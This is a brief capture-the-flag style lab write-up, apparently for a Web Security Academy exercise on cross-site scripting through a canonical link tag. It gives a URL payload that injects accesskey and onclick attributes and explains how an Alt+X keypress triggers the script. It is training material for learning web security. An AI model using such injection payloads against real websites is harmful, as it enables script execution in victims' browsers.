## Solution steps

- View the page source and notice the canonical link tag: `<link rel="canonical" href='https://0aed004c039c76ac80e9a88f00080026.web-security-academy.net/'/>`
- By keeping in mind the clue "The simulated user will press ALT+SHIFT+X, CTRL+ALT+X, or ALT+X" and the intended solution to this lab is only possible in Chrome.
- Insert this payload directly to link: `?'accesskey='x'onclick='alert(1)`
- Like this: `https://YOUR-LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)`

### How it works?
- The `accesskey="x"` binds the `Alt+X` (or OS/browser equivalent) to the `<link>` element.
- When the user presses `Alt+X`, the browser “clicks” the element bound to that access key.
- Since your element now has `onclick="alert(1)"`, this gets executed!
